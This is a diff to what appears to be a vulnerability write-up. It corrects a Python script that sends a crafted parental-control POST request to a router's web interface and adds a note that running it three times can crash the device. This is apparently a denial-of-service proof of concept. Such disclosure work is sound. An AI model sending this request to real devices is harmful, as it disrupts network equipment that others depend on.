@@ -75,7 +75,7 @@ payload={
   "enable":"1",
   "time":"19%3A00-21%3A00",
   "url_enable":"1",
-  "urls":"123".
+  "urls":"123",
   "day":"1%2C1%2C1%2C1%2C1%2C1%2C1",
   "limit_type":"0"
 }
@@ -86,7 +86,7 @@ headers = {
   "Accept-Encoding":"gzip, deflate",
   "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
   "X-Requested-With":"XMLHttpRequest",
-  "Content-Length":275,
+  "Content-Length":"275",
   "Origin":"http://192.168.33.6",
   "Connection":"close",
   "Referer":"http://192.168.33.6/parental_control.html?random=0.8184817073009409&"
@@ -96,4 +96,4 @@ response = requests.request("POST", url, headers=headers, data=payload)
 
 print(response.text)
 ```
-
+Running the script three times can cause a crash
